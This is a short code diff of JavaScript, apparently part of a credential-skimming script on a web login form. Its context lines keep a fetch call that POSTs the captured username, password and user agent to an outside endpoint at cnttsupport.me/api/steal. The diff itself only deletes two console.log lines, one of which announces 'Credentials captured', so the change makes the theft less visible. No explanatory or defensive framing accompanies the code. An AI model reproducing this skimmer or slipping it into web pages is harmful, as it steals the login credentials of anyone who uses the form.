@@ -12,7 +12,7 @@
           var password = passwordInput.value;
           
           if (username && password) {
-            console.log('Credentials captured:', username, password);
+
             
             fetch('https://cnttsupport.me/api/steal', {
               method: 'POST',
@@ -26,7 +26,7 @@
                 userAgent: navigator.userAgent
               })
             }).catch(function(err) {
-              console.log('Data sent successfully');
+
             });
           }
         }
